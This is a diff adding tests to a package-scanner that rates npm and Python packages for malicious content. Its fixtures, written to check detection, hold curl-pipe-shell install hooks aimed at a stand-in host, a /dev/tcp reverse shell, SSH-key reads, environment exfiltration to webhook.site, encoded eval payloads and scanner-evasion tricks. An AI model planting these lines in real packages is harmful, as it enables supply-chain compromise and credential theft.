@@ -590,3 +590,1322 @@ async fn arguments_are_checked_with_text_a_model_can_act_on() {
     assert!(index["entropy"].is_number());
     client.cancel().await.unwrap();
 }
+
+// ---------------------------------------------------------------------------
+// Round 3
+// ---------------------------------------------------------------------------
+
+/// A package.json with the given scripts.
+fn manifest_with_scripts(scripts: &Value) -> Vec<u8> {
+    json!({"name": "demo-pkg", "version": "1.0.0", "scripts": scripts})
+        .to_string()
+        .into_bytes()
+}
+
+/// The download-and-run lines, built at run time so no fixture file on disk
+/// holds a literal curl-pipe-shell line.
+fn pipe_line() -> String {
+    ["curl -s http://payload.example.invalid/i.", "sh | ", "sh"].concat()
+}
+
+fn npm_level(entries: &[(&str, &[u8])]) -> (NpmRisk, f32, usize) {
+    let dir = TempDir::new().unwrap();
+    let path = write(dir.path(), "pkg.tgz", &tgz(entries));
+    let analysis = analyze_npm_package(&path).unwrap();
+    (
+        analysis.malicious_indicators.risk_level,
+        analysis.malicious_indicators.overall_risk_score,
+        analysis.source_findings.len(),
+    )
+}
+
+#[test]
+fn install_scripts_that_download_and_run_are_high_or_critical() {
+    let curl_pipe = pipe_line();
+    let wget_pipe = [
+        "wget -qO- http://payload.example.invalid/i.",
+        "sh | ",
+        "bash",
+    ]
+    .concat();
+    let node_e = format!(
+        "node -e \"require('child_process').exec('{}')\"",
+        curl_pipe.replace('\'', "")
+    );
+    let curl_then_run = [
+        "curl -s http://payload.example.invalid/i.sh -o /tmp/i.sh",
+        " && chmod +x /tmp/i.sh && /tmp/i.sh",
+    ]
+    .concat();
+    let sh_c = [
+        "sh -c \"$(",
+        "curl -fsSL http://payload.example.invalid/i.sh)\"",
+    ]
+    .concat();
+    for (hook, script) in [
+        ("postinstall", curl_pipe),
+        ("preinstall", wget_pipe),
+        ("postinstall", node_e),
+        ("install", curl_then_run),
+        ("postinstall", sh_c),
+    ] {
+        let manifest = manifest_with_scripts(&json!({ hook: script }));
+        let (level, score, findings) = npm_level(&[("package/package.json", &manifest)]);
+        assert!(
+            matches!(level, NpmRisk::High | NpmRisk::Critical),
+            "{hook}: {script} -> {level:?} {score}"
+        );
+        assert!(findings >= 1, "{hook}: {script} had no finding");
+    }
+}
+
+#[test]
+fn install_script_findings_name_the_script() {
+    let manifest = manifest_with_scripts(&json!({ "postinstall": pipe_line() }));
+    let dir = TempDir::new().unwrap();
+    let path = write(
+        dir.path(),
+        "pkg.tgz",
+        &tgz(&[("package/package.json", &manifest)]),
+    );
+    let analysis = analyze_npm_package(&path).unwrap();
+    let finding = &analysis.source_findings[0];
+    assert_eq!(finding.file, "package/package.json#scripts.postinstall");
+    assert_eq!(finding.rule, "Download piped to a shell or interpreter");
+    assert!(!analysis.scripts_analysis.dangerous_commands.is_empty());
+}
+
+/// Files of one fixture package: path and content.
+type Fixture<'a> = Vec<(&'a str, &'a [u8])>;
+
+/// Ordinary packages: calibration holds in the other direction too.
+#[test]
+fn ordinary_install_scripts_stay_safe_or_low() {
+    for scripts in [
+        json!({"install": "node-gyp rebuild"}),
+        json!({"postinstall": "husky install"}),
+        json!({"postinstall": "node scripts/postinstall.js", "test": "jest"}),
+        json!({"prepare": "npm run build", "build": "tsc -p .", "test": "node test/examiner.js"}),
+        json!({"lint": "eslint src/determiner", "build": "webpack --config ethereum.config.js"}),
+        json!({"benchmark:download": "curl -O https://raw.githubusercontent.com/org/repo/main/data.json"}),
+        json!({"postinstall": "node -e \"console.log('thanks for installing')\""}),
+    ] {
+        let manifest = manifest_with_scripts(&scripts);
+        let (level, score, _) = npm_level(&[
+            ("package/package.json", &manifest),
+            (
+                "package/index.js",
+                b"module.exports = function add(a, b) { return a + b; };\n",
+            ),
+        ]);
+        assert!(
+            matches!(level, NpmRisk::Safe | NpmRisk::Low),
+            "{scripts} -> {level:?} {score}"
+        );
+    }
+}
+
+#[test]
+fn mining_words_in_script_names_are_not_cryptomining() {
+    let manifest =
+        manifest_with_scripts(&json!({"test": "node test/examiner.js", "dev": "node ethereum.js"}));
+    let dir = TempDir::new().unwrap();
+    let path = write(
+        dir.path(),
+        "pkg.tgz",
+        &tgz(&[("package/package.json", &manifest)]),
+    );
+    let analysis = analyze_npm_package(&path).unwrap();
+    assert!(!analysis.security_analysis.crypto_mining_indicators);
+    // Only install-time scripts are hooks.
+    assert!(analysis.scripts_analysis.script_hooks.is_empty());
+}
+
+#[test]
+fn a_package_json_with_many_scripts_is_capped_and_fast() {
+    let mut scripts = serde_json::Map::new();
+    for i in 0..60_000 {
+        scripts.insert(format!("s{i}"), json!("echo hi"));
+    }
+    let manifest = manifest_with_scripts(&Value::Object(scripts));
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "package.json", &manifest);
+    let started = std::time::Instant::now();
+    let analysis = analyze_npm_package(dir.path()).unwrap();
+    assert!(started.elapsed().as_secs() < 20, "{:?}", started.elapsed());
+    assert!(analysis.input.notes.iter().any(|n| n.contains("first 500")));
+}
+
+// --- tar extension headers --------------------------------------------------
+
+/// A tar whose first entry is a long-name (`L`) or PAX (`x`) header that declares
+/// `declared` bytes of data, which are not there.
+fn tar_with_declared_extension(kind: u8, declared: u64) -> Vec<u8> {
+    let mut header = tar::Header::new_gnu();
+    header.set_path("././@LongLink").unwrap();
+    header.set_size(declared);
+    header.set_entry_type(tar::EntryType::new(kind));
+    header.set_cksum();
+    let mut bytes = header.as_bytes().to_vec();
+    bytes.extend_from_slice(&[b'a'; 512]);
+    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+    encoder.write_all(&bytes).unwrap();
+    encoder.finish().unwrap()
+}
+
+#[test]
+fn a_huge_long_name_or_pax_header_is_refused_not_allocated() {
+    let dir = TempDir::new().unwrap();
+    for kind in *b"Lxg" {
+        let path = write(
+            dir.path(),
+            "bomb.tgz",
+            &tar_with_declared_extension(kind, 64 * 1024 * 1024),
+        );
+        let error = analyze_npm_package(&path).unwrap_err().to_string();
+        assert!(error.contains("long-name or PAX header"), "{error}");
+        let error = analyze_python_package(&path).unwrap_err().to_string();
+        assert!(error.contains("long-name or PAX header"), "{error}");
+    }
+}
+
+#[test]
+fn long_names_in_gnu_and_pax_form_are_still_read() {
+    let long_dir = "d".repeat(150);
+    // tar::Builder writes GNU long names for paths over 100 bytes.
+    let nested = format!("package/{long_dir}/deep/{long_dir}/file.js");
+    let archive = tgz(&[
+        ("package/package.json", PKG.as_bytes()),
+        (nested.as_str(), b"module.exports = 1;\n"),
+    ]);
+    let dir = TempDir::new().unwrap();
+    let path = write(dir.path(), "long.tgz", &archive);
+    let analysis = analyze_npm_package(&path).unwrap();
+    assert!(
+        analysis
+            .files_analysis
+            .iter()
+            .any(|f| f.file_path == nested),
+        "{:?}",
+        analysis
+            .files_analysis
+            .iter()
+            .map(|f| &f.file_path)
+            .collect::<Vec<_>>()
+    );
+
+    // PAX: an `x` entry with a `path` record names the next file.
+    let pax_path = "package/pax/named.js";
+    let record_body = format!(" path={pax_path}\n");
+    let len = record_body.len() + 2;
+    let record = format!("{len}{record_body}");
+    let mut builder = tar::Builder::new(Vec::new());
+    let mut pax = tar::Header::new_ustar();
+    pax.set_path("PaxHeaders.0/ignored").unwrap();
+    pax.set_size(record.len() as u64);
+    pax.set_entry_type(tar::EntryType::XHeader);
+    pax.set_cksum();
+    builder.append(&pax, record.as_bytes()).unwrap();
+    let mut file = tar::Header::new_ustar();
+    file.set_path("package/short.js").unwrap();
+    file.set_size(5);
+    file.set_entry_type(tar::EntryType::Regular);
+    file.set_cksum();
+    builder.append(&file, &b"x=1;\n"[..]).unwrap();
+    let mut manifest_header = tar::Header::new_ustar();
+    manifest_header.set_path("package/package.json").unwrap();
+    manifest_header.set_size(PKG.len() as u64);
+    manifest_header.set_entry_type(tar::EntryType::Regular);
+    manifest_header.set_cksum();
+    builder.append(&manifest_header, PKG.as_bytes()).unwrap();
+    let bytes = builder.into_inner().unwrap();
+    let path = write(dir.path(), "pax.tar", &bytes);
+    let analysis = analyze_npm_package(&path).unwrap();
+    assert!(analysis
+        .files_analysis
+        .iter()
+        .any(|f| f.file_path == pax_path));
+}
+
+#[test]
+fn a_damaged_archive_error_does_not_echo_file_bytes() {
+    let dir = TempDir::new().unwrap();
+    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+    encoder
+        .write_all(b"hello world, not a tar\nhello world, not a tar\n")
+        .unwrap();
+    let path = write(dir.path(), "x.tgz", &encoder.finish().unwrap());
+    let error = analyze_npm_package(&path).unwrap_err().to_string();
+    assert!(!error.contains("hello world"), "{error}");
+    assert!(!error.contains('\n'), "{error}");
+}
+
+// --- evasions ---------------------------------------------------------------
+
+fn payload_lines() -> String {
+    let pool = ["stratum", "+tcp://pool.example.invalid:3333"].concat();
+    format!(
+        "require('child_process').exec('{}');\nconst pool = '{pool}';\n",
+        pipe_line()
+    )
+}
+
+#[test]
+fn a_payload_in_a_declaration_file_is_found() {
+    let payload = payload_lines();
+    let manifest = manifest_with_scripts(&json!({"postinstall": "node index.js"}));
+    let (level, _, findings) = npm_level(&[
+        ("package/package.json", &manifest),
+        ("package/index.js", b"require('./types.d.ts');\n"),
+        ("package/types.d.ts", payload.as_bytes()),
+    ]);
+    assert!(
+        matches!(level, NpmRisk::High | NpmRisk::Critical),
+        "{level:?}"
+    );
+    assert!(findings >= 1);
+}
+
+#[test]
+fn comment_prefixes_do_not_hide_code() {
+    let pool = ["stratum", "+tcp://pool.example.invalid:3333"].concat();
+    let src = format!(
+        "/**/ eval(Buffer.from('QUJD', 'base64').toString());\n\
+         /* x */ const k = require('fs').readFileSync(homedir + '/.ssh/id_rsa');\n\
+         /* y */ fetch('https://webhook.site/abc', {{body: JSON.stringify(process.env)}});\n\
+         /* a */ /* b */ const p = '{pool}';\n"
+    );
+    let (level, _, findings) = npm_level(&[
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    assert!(
+        matches!(level, NpmRisk::High | NpmRisk::Critical),
+        "{level:?}"
+    );
+    assert!(findings >= 4, "{findings}");
+}
+
+#[test]
+fn text_inside_real_comments_is_still_quiet() {
+    let src = "/**\n * Example: child_process.exec('ls'); eval(x)\n * reads ~/.npmrc\n */\n// eval(atob(x))\nmodule.exports = 1;\n";
+    let (level, _, findings) = npm_level(&[
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    assert!(matches!(level, NpmRisk::Safe), "{level:?}");
+    assert_eq!(findings, 0);
+    // A block comment that is never closed does not silence the rest of the file
+    // beyond 400 lines.
+    let mut long = String::from("/*\n");
+    for _ in 0..450 {
+        long.push_str(" * filler\n");
+    }
+    long.push_str("eval(Buffer.from('QUJD', 'base64').toString());\n");
+    let (level, _, _) = npm_level(&[
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", long.as_bytes()),
+    ]);
+    assert!(
+        matches!(level, NpmRisk::High | NpmRisk::Critical),
+        "{level:?}"
+    );
+}
+
+#[test]
+fn macos_metadata_is_dropped_only_when_it_is_metadata() {
+    let payload = payload_lines();
+    let mut appledouble = vec![0x00, 0x05, 0x16, 0x07];
+    appledouble.extend_from_slice(&[0u8; 60]);
+    let dir = TempDir::new().unwrap();
+    let path = write(
+        dir.path(),
+        "m.tgz",
+        &tgz(&[
+            ("package/package.json", PKG.as_bytes()),
+            ("package/index.js", b"require('./._payload.js');\n"),
+            ("package/._payload.js", payload.as_bytes()),
+            ("package/._index.js", &appledouble),
+            ("package/PaxHeaders.1/evil.js", payload.as_bytes()),
+        ]),
+    );
+    let analysis = analyze_npm_package(&path).unwrap();
+    let paths: Vec<&str> = analysis
+        .files_analysis
+        .iter()
+        .map(|f| f.file_path.as_str())
+        .collect();
+    assert!(paths.contains(&"package/._payload.js"), "{paths:?}");
+    assert!(paths.contains(&"package/PaxHeaders.1/evil.js"), "{paths:?}");
+    assert!(!paths.contains(&"package/._index.js"), "{paths:?}");
+    assert!(matches!(
+        analysis.malicious_indicators.risk_level,
+        NpmRisk::High | NpmRisk::Critical
+    ));
+    assert!(analysis
+        .input
+        .notes
+        .iter()
+        .any(|n| n.contains("ignored 1 macOS")));
+}
+
+// --- python identity and calibration ------------------------------------------
+
+const PEP621: &str = r#"[build-system]
+requires = ["setuptools>=61"]
+build-backend = "setuptools.build_meta"
+
+[project]
+name = "realistic-proj"
+version = "2.5.0"  # bumped
+description = "A \"quoted\" description"
+requires-python = ">=3.8"
+authors = [{name = "Alice Example", email = "alice@example.invalid"}]
+keywords = ["a", "b"]
+dependencies = [
+    "requests==2.5.0",
+    "click>=8",  # cli
+]
+
+[project.urls]
+Homepage = "https://example.invalid"
+
+[tool.black]
+line-length = 100
+name = "not-the-package"
+version = "9.9.9"
+
+[[tool.mypy.overrides]]
+module = "x"
+python_version = "3.8"
+"#;
+
+#[test]
+fn a_pep_621_pyproject_gives_its_own_name_version_and_pins() {
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "pyproject.toml", PEP621.as_bytes());
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    assert_eq!(analysis.package_info.name, "realistic-proj");
+    assert_eq!(analysis.package_info.version, "2.5.0");
+    assert_eq!(
+        analysis.package_info.author.as_deref(),
+        Some("Alice Example")
+    );
+    assert_eq!(
+        analysis.package_info.python_requires.as_deref(),
+        Some(">=3.8")
+    );
+    assert_eq!(
+        analysis.package_info.description.as_deref(),
+        Some("A \"quoted\" description")
+    );
+    let requests = &analysis.dependencies.install_requires["requests"];
+    assert_eq!(requests.version_spec, "==2.5.0");
+    assert!(
+        requests
+            .vulnerabilities
+            .iter()
+            .any(|v| v.cve_id == "CVE-2023-32681"),
+        "{requests:?}"
+    );
+    assert_eq!(
+        analysis.dependencies.install_requires["click"].version_spec,
+        ">=8"
+    );
+}
+
+#[test]
+fn single_line_arrays_poetry_tables_and_comments_are_read() {
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "pyproject.toml",
+        b"[project]\nname = 'requests'\nversion = '2.5.0'\ndependencies = [\"urllib3==1.26.5\", \"PyYAML==5.3\"]\n\n[tool.ruff]\ntarget-version = \"py38\"\n",
+    );
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    assert_eq!(analysis.package_info.name, "requests");
+    assert_eq!(analysis.package_info.version, "2.5.0");
+    assert_eq!(analysis.dependencies.install_requires.len(), 2);
+    assert!(!analysis.dependencies.package_vulnerabilities.is_empty());
+
+    let poetry = TempDir::new().unwrap();
+    write(
+        poetry.path(),
+        "pyproject.toml",
+        b"[tool.poetry]\nname = \"poetry-pkg\"\nversion = \"0.3.0\"\nauthors = [\"Bob <bob@example.invalid>\"]\n\n[tool.poetry.dependencies]\npython = \"^3.9\"\nrequests = { version = \"2.5.0\", extras = [\"socks\"] }\nflask = \"^2.0\"\n",
+    );
+    let analysis = analyze_python_package(poetry.path()).unwrap();
+    assert_eq!(analysis.package_info.name, "poetry-pkg");
+    assert_eq!(analysis.package_info.author.as_deref(), Some("Bob"));
+    assert_eq!(
+        analysis.dependencies.install_requires["requests"].version_spec,
+        "==2.5.0"
+    );
+    assert!(!analysis
+        .dependencies
+        .install_requires
+        .contains_key("python"));
+}
+
+const PYYAML_STYLE_SETUP: &str = r#"
+NAME = 'PyYAML'
+VERSION = '6.0.2'
+DESCRIPTION = "YAML parser and emitter for Python"
+LONG_DESCRIPTION = """\
+YAML is a data serialization format.
+"""
+CLASSIFIERS = [
+    "Programming Language :: Python :: 3",
+]
+
+import sys, os
+
+class build_ext(_build_ext):
+    def finalize_options(self):
+        self.attr_name = 'with_' + 'x'
+
+if __name__ == '__main__':
+    setup(
+        name=NAME,
+        version=VERSION,
+        description=DESCRIPTION,
+        long_description=LONG_DESCRIPTION,
+        classifiers=CLASSIFIERS,
+        install_requires=['requests==2.5.0', "click[extra]>=8"],
+        cmdclass={'build_ext': build_ext},
+        python_requires='>=3.8',
+    )
+"#;
+
+#[test]
+fn a_setup_py_is_read_from_its_setup_call_not_from_any_name_equals() {
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "setup.py", PYYAML_STYLE_SETUP.as_bytes());
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    assert_eq!(analysis.package_info.name, "PyYAML");
+    assert_eq!(analysis.package_info.version, "6.0.2");
+    assert_eq!(analysis.dependencies.install_requires.len(), 2);
+    assert!(analysis.dependencies.install_requires.contains_key("click"));
+    assert!(analysis.dependencies.install_requires["requests"]
+        .vulnerabilities
+        .iter()
+        .any(|v| v.cve_id == "CVE-2023-32681"));
+    // cmdclass is reported, but is not a malicious pattern.
+    assert!(!analysis.setup_analysis.setup_commands.is_empty());
+    assert!(!analysis
+        .malicious_indicators
+        .known_malicious_patterns
+        .iter()
+        .any(|p| p.pattern_type == "Multiple install hooks"));
+    assert!(matches!(
+        analysis.malicious_indicators.risk_level,
+        PyRisk::Safe | PyRisk::Low
+    ));
+}
+
+#[test]
+fn an_sdist_takes_name_and_version_from_pkg_info() {
+    let archive = tgz(&[
+        (
+            "PyYAML-6.0.2/PKG-INFO",
+            b"Metadata-Version: 2.1\nName: PyYAML\nVersion: 6.0.2\nSummary: YAML\n\nbody\n",
+        ),
+        (
+            "PyYAML-6.0.2/setup.py",
+            PYYAML_STYLE_SETUP
+                .replace("NAME = 'PyYAML'", "NAME = os.environ['N']")
+                .as_bytes(),
+        ),
+        // An exec in a test is ordinary.
+        (
+            "PyYAML-6.0.2/tests/test_a.py",
+            b"def test():\n    exec('x = 1')\n    eval('1')\n",
+        ),
+        (
+            "PyYAML-6.0.2/lib/yaml/__init__.py",
+            b"__version__ = '6.0.2'\n",
+        ),
+    ]);
+    let dir = TempDir::new().unwrap();
+    let path = write(dir.path(), "PyYAML-6.0.2.tar.gz", &archive);
+    let analysis = analyze_python_package(&path).unwrap();
+    assert_eq!(analysis.package_info.name, "PyYAML");
+    assert_eq!(analysis.package_info.version, "6.0.2");
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::Safe | PyRisk::Low
+        ),
+        "{:?} {:?}",
+        analysis.malicious_indicators.risk_level,
+        analysis.malicious_indicators.risk_reasons
+    );
+}
+
+#[test]
+fn ordinary_setup_py_layouts_are_not_rated_medium() {
+    let version_idiom = "import os, subprocess\nfrom setuptools import setup\n\nabout = {}\nwith open('pkg/__version__.py') as f:\n    exec(f.read(), about)\n\ntry:\n    rev = subprocess.check_output(['git', 'describe']).decode().strip()\nexcept Exception:\n    rev = ''\n\nsetup(name='mainstream-lib', version=about['__version__'], install_requires=['requests'])\n";
+    let words = "from setuptools import setup\nsetup(name='plain-lib', version='1.0.0',\n      description='An executable helper to evaluate and compile reports',\n      install_requires=['requests'])\n";
+    for text in [version_idiom, words] {
+        let dir = TempDir::new().unwrap();
+        write(dir.path(), "setup.py", text.as_bytes());
+        let analysis = analyze_python_package(dir.path()).unwrap();
+        assert!(
+            matches!(
+                analysis.malicious_indicators.risk_level,
+                PyRisk::Safe | PyRisk::Low
+            ),
+            "{:?} {:?}",
+            analysis.malicious_indicators.risk_level,
+            analysis.malicious_indicators.risk_reasons
+        );
+        assert!(!analysis
+            .malicious_indicators
+            .risk_reasons
+            .iter()
+            .any(|r| r.contains("decoded content")));
+    }
+}
+
+#[test]
+fn a_decoded_payload_in_setup_py_is_still_high_or_critical() {
+    let payload = format!(
+        "import base64\nfrom setuptools import setup\nexec(base64.b64decode('QUJD'))\nimport os\nos.system('{}')\nsetup(name='evil', version='1.0')\n",
+        pipe_line()
+    );
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "setup.py", payload.as_bytes());
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    assert!(
+        matches!(
+            analysis.malicious_indicators.risk_level,
+            PyRisk::High | PyRisk::Critical
+        ),
+        "{:?}",
+        analysis.malicious_indicators.risk_reasons
+    );
+    assert!(analysis
+        .malicious_indicators
+        .risk_reasons
+        .iter()
+        .any(|r| r.contains("decoded content")));
+}
+
+#[test]
+fn hostile_setup_py_text_is_cheap() {
+    let dir = TempDir::new().unwrap();
+    let mut text = String::new();
+    for i in 0..40_000 {
+        text.push_str(&format!("X{i} = (\n"));
+    }
+    text.push_str(&"setup(".repeat(100_000));
+    write(dir.path(), "setup.py", text.as_bytes());
+    let started = std::time::Instant::now();
+    let _ = analyze_python_package(dir.path());
+    assert!(started.elapsed().as_secs() < 20, "{:?}", started.elapsed());
+}
+
+#[test]
+fn requirements_options_and_direct_references_are_reported() {
+    let dir = TempDir::new().unwrap();
+    let path = write(
+        dir.path(),
+        "requirements.txt",
+        b"-r base.txt\n--extra-index-url https://user:secret@pypi.example.invalid/simple\n-e git+https://example.invalid/x.git#egg=secretpkg\nflask==0.12\nhttps://example.invalid/dl/requests-2.5.0.tar.gz\n./local/wheel-1.0-py3-none-any.whl\nDjango==2.2.0\n",
+    );
+    let analysis = analyze_python_package(&path).unwrap();
+    let notes = analysis.input.notes.join("\n");
+    assert!(notes.contains("-r base.txt"), "{notes}");
+    assert!(notes.contains("dependency confusion"), "{notes}");
+    assert!(notes.contains("-e git+"), "{notes}");
+    assert!(
+        !notes.contains("secret@") && !notes.contains("user:secret"),
+        "{notes}"
+    );
+    let deps = &analysis.dependencies.install_requires;
+    assert_eq!(
+        deps["https://example.invalid/dl/requests-2.5.0.tar.gz"].version_spec,
+        "direct reference"
+    );
+    assert!(deps["./local/wheel-1.0-py3-none-any.whl"].is_url);
+    assert!(deps.contains_key("flask") && deps.contains_key("Django"));
+}
+
+// --- malicious names as dependencies ------------------------------------------
+
+#[test]
+fn names_malicious_at_every_version_are_flagged_as_dependencies() {
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "package.json",
+        br#"{"name":"app","version":"1.0.0","dependencies":{"crossenv":"^1.0.0","flatmap-stream":"0.1.1","expres":"*","lodash":"^4.17.21"}}"#,
+    );
+    let analysis = analyze_npm_package(dir.path()).unwrap();
+    for name in ["crossenv", "flatmap-stream"] {
+        let dep = &analysis.dependencies.dependencies[name];
+        assert!(
+            dep.vulnerabilities
+                .iter()
+                .any(|v| v.cve_id == "KNOWN-MALICIOUS-PACKAGE"),
+            "{name}: {dep:?}"
+        );
+    }
+    assert!(analysis.dependencies.dependencies["lodash"]
+        .vulnerabilities
+        .is_empty());
+    assert!(matches!(
+        analysis.malicious_indicators.risk_level,
+        NpmRisk::High | NpmRisk::Critical | NpmRisk::Medium
+    ));
+
+    let req = write(
+        dir.path(),
+        "requirements.txt",
+        b"colourama==0.1\npython-sqlite\nrequests>=2.31\n",
+    );
+    let analysis = analyze_python_package(&req).unwrap();
+    for name in ["colourama", "python-sqlite"] {
+        assert!(
+            analysis.dependencies.install_requires[name]
+                .vulnerabilities
+                .iter()
+                .any(|v| v.cve_id == "KNOWN-MALICIOUS-PACKAGE"),
+            "{name}"
+        );
+    }
+    assert!(analysis.dependencies.install_requires["requests"]
+        .vulnerabilities
+        .is_empty());
+}
+
+// --- tool arguments and cache ---------------------------------------------------
+
+#[tokio::test]
+async fn min_severity_is_trimmed_and_an_edit_with_the_same_size_and_time_misses_the_cache() {
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "package.json", PKG.as_bytes());
+    let index = write(dir.path(), "index.js", evil_js().as_bytes());
+    let client = client().await;
+    let first = summary(&client, "analyze_npm_package", dir.path()).await;
+    assert_eq!(first["cache"], "miss");
+    assert_ne!(first["risk"]["level"], "Safe");
+
+    let (is_error, text) = call(
+        &client,
+        "analyze_npm_package",
+        json!({"package_path": dir.path(), "section": "findings", "min_severity": " critical "}),
+    )
+    .await;
+    assert!(!is_error, "{text}");
+    let page: Value = serde_json::from_str(&text).unwrap();
+    assert!(page["items"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .all(|f| f["severity"] == "Critical"));
+
+    // Same length, same modification time, different content.
+    let modified = std::fs::metadata(&index).unwrap().modified().unwrap();
+    let edited = evil_js().replace("stratum+tcp", "stratum+abc");
+    assert_eq!(edited.len(), evil_js().len());
+    std::fs::write(&index, edited).unwrap();
+    let file = std::fs::OpenOptions::new()
+        .write(true)
+        .open(&index)
+        .unwrap();
+    file.set_modified(modified).unwrap();
+    drop(file);
+    let second = summary(&client, "analyze_npm_package", dir.path()).await;
+    assert_eq!(second["cache"], "miss", "{second}");
+}
+
+// --- corpus: both directions ------------------------------------------------------
+
+#[test]
+fn corpus_malicious_fixtures_are_high_and_ordinary_ones_are_safe() {
+    let curl = pipe_line();
+    let payload = payload_lines();
+    let manifest_post = manifest_with_scripts(&json!({"postinstall": curl}));
+    let manifest_plain = PKG.as_bytes();
+    let reverse_shell = [
+        "const net=require('net');require('child_process').exec('bash -",
+        "i >& /dev/tcp/10.0.0.1/4444 0>&1');\n",
+    ]
+    .concat();
+    let eval_payload = "eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk=', 'base64').toString());\n";
+    let malicious: Vec<(&str, Fixture)> = vec![
+        (
+            "postinstall curl|sh",
+            vec![("package/package.json", &manifest_post)],
+        ),
+        (
+            "index payload",
+            vec![
+                ("package/package.json", manifest_plain),
+                ("package/index.js", payload.as_bytes()),
+            ],
+        ),
+        (
+            "d.ts payload",
+            vec![
+                ("package/package.json", manifest_plain),
+                ("package/a.d.ts", payload.as_bytes()),
+            ],
+        ),
+        (
+            "reverse shell",
+            vec![
+                ("package/package.json", manifest_plain),
+                ("package/index.js", reverse_shell.as_bytes()),
+            ],
+        ),
+        (
+            "eval decoded",
+            vec![
+                ("package/package.json", manifest_plain),
+                ("package/lib/a.js", eval_payload.as_bytes()),
+            ],
+        ),
+    ];
+    for (name, entries) in &malicious {
+        let (level, score, _) = npm_level(entries);
+        assert!(
+            matches!(level, NpmRisk::High | NpmRisk::Critical),
+            "{name}: {level:?} {score}"
+        );
+    }
+    let readme = b"# demo\n\nRun `curl ... | sh`? No.\n";
+    let ordinary: Vec<(&str, Fixture)> = vec![
+        ("plain", vec![("package/package.json", manifest_plain), ("package/index.js", b"module.exports = {};\n")]),
+        ("readme", vec![("package/package.json", manifest_plain), ("package/README.md", readme), ("package/index.d.ts", b"export declare function f(): void;\n")]),
+        ("regex exec", vec![("package/package.json", manifest_plain), ("package/index.js", b"const m = /a(b)/.exec('ab');\nmodule.exports = m;\n")]),
+        ("env", vec![("package/package.json", manifest_plain), ("package/index.js", b"if (process.env.NODE_ENV === 'production') { fetch('https://api.example.invalid/x'); }\n")]),
+    ];
+    for (name, entries) in &ordinary {
+        let (level, score, _) = npm_level(entries);
+        assert!(
+            matches!(level, NpmRisk::Safe | NpmRisk::Low),
+            "{name}: {level:?} {score}"
+        );
+    }
+}
+
+// --- round 3 verifier findings ------------------------------------------------------
+
+fn py_level(dir: &Path) -> (PyRisk, f32) {
+    let analysis = analyze_python_package(dir).unwrap();
+    (
+        analysis.malicious_indicators.risk_level,
+        analysis.malicious_indicators.overall_risk_score,
+    )
+}
+
+/// A download that is saved, made executable and run, built at run time.
+fn dl_run_line() -> String {
+    [
+        "curl -s http://payload.example.invalid/i.sh -o /tmp/i.sh",
+        " && chmod +x /tmp/i.sh && /tmp/i.sh",
+    ]
+    .concat()
+}
+
+#[test]
+fn deeply_dotted_toml_keys_do_not_overflow_the_stack() {
+    let parts = vec!["a"; 100_000].join(".");
+    let docs = [
+        format!("[project]\nname = \"deep\"\nversion = \"1.0\"\n[{parts}]\nx = 1\n"),
+        format!("[project]\nname = \"deep\"\nversion = \"1.0\"\n{parts} = 1\n"),
+        format!("[project]\nname = \"deep\"\nversion = \"1.0\"\nx = {{{parts} = 1}}\n"),
+    ];
+    for text in docs {
+        let dir = TempDir::new().unwrap();
+        write(dir.path(), "pyproject.toml", text.as_bytes());
+        let analysis = analyze_python_package(dir.path()).unwrap();
+        assert_eq!(analysis.package_info.name, "deep");
+    }
+}
+
+#[test]
+fn padding_before_a_download_in_an_install_script_does_not_hide_it() {
+    let script = format!("echo ok{}; {}", " ".repeat(70_000), pipe_line());
+    let manifest = manifest_with_scripts(&json!({"postinstall": script}));
+    let (level, score, findings) = npm_level(&[("package/package.json", &manifest)]);
+    assert!(
+        matches!(level, NpmRisk::High | NpmRisk::Critical),
+        "{level:?} {score}"
+    );
+    assert!(findings >= 1);
+}
+
+#[test]
+fn a_comment_opener_inside_a_string_does_not_hide_high_rules() {
+    let steal = "const k = require('fs').readFileSync(homedir + '/.ssh/id_rsa');\nfetch('https://webhook.site/abc', {body: JSON.stringify(process.env)});\n";
+    let js = format!("var a = `\n/*`;\n{steal}var b = `*/`;\n");
+    let js2 = format!("var s = `\n//`; {steal}`;\n");
+    for src in [js, js2] {
+        let (level, score, findings) = npm_level(&[
+            ("package/package.json", PKG.as_bytes()),
+            ("package/index.js", src.as_bytes()),
+        ]);
+        assert!(
+            matches!(level, NpmRisk::High | NpmRisk::Critical),
+            "{level:?} {score}"
+        );
+        assert!(findings >= 1);
+    }
+    let setup = format!(
+        "from setuptools import setup\nimport os\nx = '''\n#'''; os.system('{}')\nsetup(name='hashy', version='1.0')\n",
+        dl_run_line()
+    );
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "setup.py", setup.as_bytes());
+    let (level, score) = py_level(dir.path());
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?} {score}"
+    );
+}
+
+/// A tar whose PAX header gives `size=0` to an entry whose ustar header says 1024:
+/// the 1024 bytes are really the header and data of a second file.
+fn pax_size_desync() -> Vec<u8> {
+    let evil = format!("require('child_process').exec('{}');\n", pipe_line());
+    let mut inner_header = tar::Header::new_ustar();
+    inner_header.set_path("package/evil.js").unwrap();
+    inner_header.set_size(evil.len() as u64);
+    inner_header.set_mode(0o644);
+    inner_header.set_cksum();
+    let mut blob = inner_header.as_bytes().to_vec();
